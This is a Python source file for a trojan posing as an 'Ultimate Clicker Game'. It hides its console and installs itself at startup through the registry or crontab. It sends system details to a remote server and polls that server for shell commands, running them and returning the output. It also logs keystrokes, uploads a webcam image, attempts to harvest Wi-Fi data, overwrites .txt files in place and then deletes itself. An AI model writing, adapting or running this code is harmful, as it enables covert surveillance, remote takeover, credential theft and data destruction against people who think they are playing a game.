import os
import platform
import socket
import time
import getpass
import requests
import shutil
import sys
import threading
import subprocess
from pynput import keyboard
import cv2
import base64
import pywifi
from pywifi import const, Profile

REMOTE_SERVER = "http://your-server.com/log_receiver"
COMMAND_SERVER = "http://your-server.com/command"

if platform.system() == "Windows":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def fake_game():
    print("🎮 Welcome to the Ultimate Clicker Game! 🎮")
    input("Press Enter to start clicking...")
    print("You clicked 1000 times! New high score! 🎉")
    time.sleep(2)

def collect_system_info():
    user = getpass.getuser()
    info = f"""
    User: {user}
    System: {platform.system()}
    Node Name: {platform.node()}
    Release: {platform.release()}
    Version: {platform.version()}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    IP Address: {socket.gethostbyname(socket.gethostname())}
    """

    hidden_file = os.path.join(os.getcwd(), ".system_log.txt")
    with open(hidden_file, "w") as file:
        file.write(info)

    return info

def send_to_server(data):
    try:
        requests.post(REMOTE_SERVER, data={"log": data})
    except:
        pass

def add_to_startup():
    startup_path = os.path.expanduser("~")
    script_path = os.path.abspath(sys.argv[0])
    startup_file = os.path.join(startup_path, ".trojan_startup.py")

    if not os.path.exists(startup_file):
        shutil.copy(script_path, startup_file)

        if platform.system() == "Windows":
            import winreg as reg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as regkey:
                reg.SetValueEx(regkey, "TrojanGame", 0, reg.REG_SZ, startup_file)
        elif platform.system() == "Linux":
            os.system(f'(crontab -l 2>/dev/null; echo "@reboot python3 {startup_file}") | crontab -')

def execute_remote_commands():
    while True:
        try:
            response = requests.get(COMMAND_SERVER)
            if response.status_code == 200:
                command = response.text.strip()
                if command.lower() == "exit":
                    break
                elif command:
                    output = subprocess.getoutput(command)
                    requests.post(REMOTE_SERVER, data={"command_output": output})
        except:
            pass
        time.sleep(10)

def keylogger():
    log_file = os.path.join(os.getcwd(), ".keystrokes.txt")

    def on_press(key):
        try:
            with open(log_file, "a") as file:
                file.write(f"{key.char}")
        except AttributeError:
            with open(log_file, "a") as file:
                file.write(f" [{key}] ")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        image_path = os.path.join(os.getcwd(), ".capture.jpg")
        cv2.imwrite(image_path, frame)
        with open(image_path, "rb") as img:
            encoded_image = base64.b64encode(img.read()).decode("utf-8")
            send_to_server(encoded_image)
    cam.release()

def wifi_password_stealer():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(5)
    results = iface.scan_results()
    wifi_data = ""

    for network in results:
        profile = Profile()
        profile.ssid = network.ssid
        profile.auth = const.AUTH_ALG_OPEN
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(5)
        password = iface.read_profiles()
        wifi_data += f"SSID: {network.ssid}, Password: {password}\n"

    hidden_file = os.path.join(os.getcwd(), ".wifi_passwords.txt")
    with open(hidden_file, "w") as file:
        file.write(wifi_data)

    send_to_server(wifi_data)

def encrypt_files():
    key = os.urandom(16)
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = base64.b64encode(data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)

def self_destruct():
    script_path = sys.argv[0]
    time.sleep(60)
    os.remove(script_path)

def run_in_background():
    threading.Thread(target=execute_remote_commands, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=capture_webcam, daemon=True).start()
    threading.Thread(target=wifi_password_stealer, daemon=True).start()
    threading.Thread(target=encrypt_files, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()

if __name__ == "__main__":
    add_to_startup()
    fake_game()
    system_info = collect_system_info()
    send_to_server(system_info)
    run_in_background()
    print("Thanks for playing!")
